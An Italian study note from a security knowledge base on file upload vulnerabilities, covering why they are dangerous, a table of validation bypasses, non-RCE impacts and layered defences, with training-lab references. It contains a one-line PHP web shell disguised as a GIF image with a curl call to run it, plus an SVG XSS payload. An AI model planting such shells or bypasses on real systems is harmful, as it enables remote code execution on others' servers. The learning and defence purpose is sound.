---
tipo: concetto
tag: [web, owasp]
fase: 3
fonti: 3
aggiornato: 2026-06-21
stato: maturo
aliases: ["Vulnerabilità Upload File", "Vulnerabilita Upload File", "File Upload", "Unrestricted File Upload"]
---

# Vulnerabilità Upload File

## In breve
La **vulnerabilità di upload file** nasce quando un'applicazione accetta file dall'utente senza validarli a dovere. Nel caso peggiore l'attaccante carica una **web shell** (es. `.php`) ed esegue codice sul server → RCE. Rientra in [[OWASP Top 10]] sotto *Insecure Design* / *Security Misconfiguration* e si combina spesso con [[File Inclusion (LFI e RFI)]].

## Perché è pericolosa
L'upload tocca tre punti critici insieme: **cosa** si carica (tipo/contenuto), **dove** finisce (path raggiungibile via web?), **come** viene servito (il server lo esegue?). Basta che uno solo fallisca.
```
File caricato → salvato in /uploads/shell.php → /uploads/shell.php?cmd=id → RCE
```

## Controlli aggirabili (e come)
| Controllo lato server | Bypass tipico |
|---|---|
| Estensione in blacklist (`.php` vietato) | estensioni alternative: `.phtml`, `.php5`, `.phar`, `.pht` |
| `Content-Type` (controlla `image/png`) | falsifica l'header con [[Burp Suite]] (il MIME è client-side) |
| Magic bytes (deve iniziare per `GIF89a`) | prepend `GIF89a;` + codice PHP nello stesso file |
| Solo estensione in whitelist | **doppia estensione** `shell.png.php`, o null byte legacy `shell.php%00.png` |
| Rinomina il file | path traversal nel filename `../../shell.php` |
| Validazione client-side (JS) | bypass totale: la richiesta si forgia con Burp/curl |

### Esempio — web shell mascherata da immagine
```bash
# file "avatar.png" con payload PHP dopo i magic bytes
printf 'GIF89a;\n<?php system($_GET["c"]); ?>' > avatar.php.png
# con Burp: intercetta l'upload, rinomina in avatar.php, Content-Type: image/png
# poi:
curl 'http://target.lab/uploads/avatar.php?c=id'
```

## Anche senza RCE
Un upload non validato resta dannoso anche se non esegui codice:
- **XSS stored** via SVG/HTML caricato (`<svg onload=alert(1)>`) → vedi [[Cross-Site Scripting (XSS)]].
- **SSRF/XXE** via file SVG o documenti che il server processa.
- **DoS**: file enormi o zip-bomb.
- **Overwrite**: path traversal sovrascrive file legittimi (`.htaccess` per riabilitare l'esecuzione PHP).

## Difesa (a livelli)
1. **Whitelist** di estensioni *e* di MIME, validati **lato server**.
2. **Verifica del contenuto** reale (libreria di image processing che ri-codifica il file → distrugge il payload nascosto).
3. **Rinomina** il file con nome random; non fidarti del filename utente.
4. **Salva fuori dal webroot** o su storage separato; servi via handler che non esegue codice.
5. Cartella upload **`noexec`** / nessun interprete (config server: niente PHP in `/uploads`).
6. Limita dimensione e numero; scansione AV.

## Lab
TryHackMe *Upload Vulnerabilities*, PortSwigger *File upload* ([[PortSwigger Web Academy]]). Strumento chiave: [[Burp Suite]] per intercettare e manipolare la richiesta multipart.

## Collegamenti
- [[OWASP Top 10]]
- [[File Inclusion (LFI e RFI)]] — combo classica per arrivare alla shell
- [[Cross-Site Scripting (XSS)]] — upload SVG/HTML
- [[Command Injection]]
- [[Burp Suite]]
- [[Reverse Shell e Bind Shell]]

## Fonti
- OWASP — Unrestricted File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- PortSwigger — File upload vulnerabilities: https://portswigger.net/web-security/file-upload
- HackTricks — File Upload: https://book.hacktricks.xyz/pentesting-web/file-upload
